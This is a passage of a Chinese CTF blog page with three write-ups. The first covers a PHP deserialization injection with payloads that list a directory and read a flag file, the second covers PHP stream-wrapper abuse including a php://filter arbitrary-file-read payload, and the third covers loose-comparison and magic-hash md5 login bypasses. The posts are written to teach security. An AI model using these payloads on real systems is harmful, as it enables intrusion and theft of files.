+<p>这些代码在本地搞，然后抓包，修改filename的值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__FILE__ :被称为PHP魔术常量,返回当前执行PHP脚本的完整路径和文件名,包含一个绝对路径</span><br><span class="line"></span><br><span class="line">dirname(__FILE__) 函数返回的是脚本所在在的路径。</span><br></pre></td></tr></table></figure></p>
+<p>下面构造序列化值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz=&apos;print_r(scandir(dirname(__FILE__)))&apos;;</span><br><span class="line">&#125;</span><br><span class="line">$obj = new OowoO();</span><br><span class="line">echo serialize($obj);</span><br><span class="line">echo &apos;&lt;br&gt;&apos;;</span><br><span class="line">$a = &apos;|O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:35:&quot;print_r(scandir(dirname(__FILE__)))&quot;;&#125;&apos;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>加上|,而且考虑到转义问题，最终的payload为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/$PFB$5$SPEMDJM_%7D1~@%25K3Y.png" alt="image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:27:\&quot;print_r(dirname(__FILE__));\&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>这条可以爆出当前目录</p>
+<p>最后通过file_get_contents()函数来读取文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>得到flag</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-php伪协议" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/07/06/php伪协议/" class="article-date">
+      <time datetime="2018-07-06T05:24:35.570Z" itemprop="datePublished">2018-07-06</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/07/06/php伪协议/">PHP伪协议</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>打CTF的时候多次遇到PHP伪协议题,这里做个深究.<br><br>php伪协议，事实上是其支持的协议与封装协议<br><br>支持的伪协议有下面这么多<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure></p>
+<p>这里主要研究PHP://</p>
+<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP://"></a>PHP://</h2><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
+<h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p>php://input代表可以访问请求的原始数据，简单来说POST请求的情况下，php://input可以获取到post的数据。</p>
+<p>比较特殊的一点，enctype=”multipart/form-data” 的时候 php://input 是无效的。multipart/form-data是将文件以二进制的形式上传，这样可以实现多种类型的文件上传。；只有使用了multipart/form-data，才能完整的传递文件数据，进行下面的操作.</p>
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>CTF有一道题代码如下:(可自行在本地搭建PHP环境测试)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$user = $_GET[&quot;user&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$pass = $_GET[&quot;pass&quot;];</span><br><span class="line"></span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;the user is admin&quot;))&#123;</span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;</span><br><span class="line">    include($file); //class.php</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;you are not admin ! &quot;;</span><br><span class="line">&#125;</span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://p1vrkwaxt.bkt.clouddn.com/RK%29_%29K9Z4T3%7B$V%5B%7B%5B@~9N62.png" alt="image"></p>
+<h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>这是最常使用的一个伪协议，一般可以利用进行任意文件读取。 </p>
+<p>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p>
+<p>事实上，在include函数的使用上，经常会造成任意文件读取漏洞，而file_get_contents()和file_put_contents()这样函数下，常常会构成getshell等更严重的漏洞。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">名称	描述</span><br><span class="line">resource=&lt;要过滤的数据流&gt;	   这个参数是必须的。它指定了你要筛选过滤的数据流。</span><br><span class="line">read=&lt;读链的筛选列表&gt;	       该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">write=&lt;写链的筛选列表&gt;	   该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;；两个链的筛选列表&gt;	       任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</span><br></pre></td></tr></table></figure></p>
+<p>我们举一个例子，这是平时我们用来任意文件读取的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=upload.php</span><br></pre></td></tr></table></figure></p>
+<p>这里读的过滤器为convert.base64-encode，就和字面上的意思一样，把输入流base64-encode。<br>resource=upload.php，代表读取upload.php的内容</p>
+<h2 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h2><p>php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</p>
+<h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $out=fopen(&quot;php://stdout&quot;, &apos;w&apos;);  </span><br><span class="line">    echo $out.&quot;\n&quot;;</span><br><span class="line">    fwrite($out , &quot;this is a test&quot;);</span><br><span class="line">    fclose($out);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>输出为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Resource id #5</span><br><span class="line">this is a test</span><br></pre></td></tr></table></figure></p>
+<p>还有很多以后补上，这里给出几篇不错的文章<br><a href="https://blog.csdn.net/Ni9htMar3/article/details/69812306?locationNum=2&amp;fps=1" target="_blank" rel="noopener">https://blog.csdn.net/Ni9htMar3/article/details/69812306?locationNum=2&amp;fps=1</a><br><br><a href="https://www.lorexxar.cn/2016/09/14/php-wei/" target="_blank" rel="noopener">https://www.lorexxar.cn/2016/09/14/php-wei/</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-phpruoleixing" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2018/07/06/phpruoleixing/" class="article-date">
+      <time datetime="2018-07-06T05:24:35.570Z" itemprop="datePublished">2018-07-06</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2018/07/06/phpruoleixing/">PHP弱类型总结</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>CTF经常出现PHP弱类型的题目，总结一下</p>
+<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = $b ;</span><br><span class="line">$a===$b ;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>== 在进行比较的时候，会先将字符串类型转化成相同，再比较</p>
+<p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</span><br></pre></td></tr></table></figure></p>
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(&quot;admin&quot;==0);  //true</span><br><span class="line">var_dump(&quot;1admin&quot;==1); //true</span><br><span class="line">var_dump(&quot;admin1&quot;==1) //false</span><br><span class="line">var_dump(&quot;admin1&quot;==0) //true</span><br><span class="line">var_dump(&quot;0e123456&quot;==&quot;0e4456789&quot;); //true </span><br><span class="line">?&gt;  //上述代码可自行测试</span><br></pre></td></tr></table></figure>
+<ul>
+<li>“admin”==0 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是0自然和0相等</li>
+<li>“1admin”==1 比较的时候会将1admin转化成数值,结果为1，而“admin1“==1 却等于错误，也就是”admin1”被转化成了0</li>
+<li>“0e123456”==”0e456789”相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含&apos;.&apos;,&apos;e&apos;,&apos;E&apos;并且其数值值在整形的范围之内</span><br><span class="line">该字符串被当作int来取值，其他所有情况下都被作为float来取值.</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$test=1 + &quot;10.5&quot;; // $test=11.5(float)</span><br><span class="line">$test=1+&quot;-1.3e3&quot;; //$test=-1299(float)</span><br><span class="line">$test=1+&quot;bob-1.3e3&quot;;//$test=1(int)</span><br><span class="line">$test=1+&quot;2admin&quot;;//$test=3(int)</span><br><span class="line">$test=1+&quot;admin2&quot;;//$test=1(int)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>所以就解释了”admin1”==1 =&gt;False 的原因</p>
+<h3 id="md5绕过"><a href="#md5绕过" class="headerlink" title="md5绕过"></a>md5绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&apos;Username&apos;]) &amp;&amp; isset($_GET[&apos;password&apos;])) &#123;</span><br><span class="line">    $logined = true;</span><br><span class="line">    $Username = $_GET[&apos;Username&apos;];</span><br><span class="line">    $password = $_GET[&apos;password&apos;];</span><br><span class="line"></span><br><span class="line">     if (!ctype_alpha($Username)) &#123;$logined = false;&#125;</span><br><span class="line">     if (!is_numeric($password) ) &#123;$logined = false;&#125;</span><br><span class="line">     if (md5($Username) != md5($password)) &#123;$logined = false;&#125;</span><br><span class="line">     if ($logined)&#123;</span><br><span class="line">    echo &quot;successful&quot;;</span><br><span class="line">      &#125;else&#123;</span><br><span class="line">           echo &quot;login failed!&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p> 输入一个字符串和数字类型，并且他们的md5值相等，就可以成功执行下一步语句<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">介绍一批md5开头是0e的字符串 上文提到过，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5(&apos;240610708&apos;) == md5(&apos;QNKCDZO&apos;)成功绕过!</span><br></pre></td></tr></table></figure></p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br></pre></td></tr></table></figure>
+<p>还有很多，以后补上<br><a href="https://www.cnblogs.com/Mrsm1th/p/6745532.html" target="_blank" rel="noopener">参考链接</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
+    </nav>
+  
+
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2018 Mr1.Grim
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo &nbsp;&nbsp;</a><a href="https://github.com/maochunguang" target="_blank">Blog</a> by tommy
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" >极客到访数: 
+                            <span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>, </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 1;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'xxxxx', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+	<script>
+	var _hmt = _hmt || [];
+	(function() {
+	  var hm = document.createElement("script");
+	  hm.src = "//hm.baidu.com/hm.js?xxxxxx";
+	  var s = document.getElementsByTagName("script")[0]; 
+	  s.parentNode.insertBefore(hm, s);
+	})();
+	</script>
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+  </div>
+</body>
+</html>
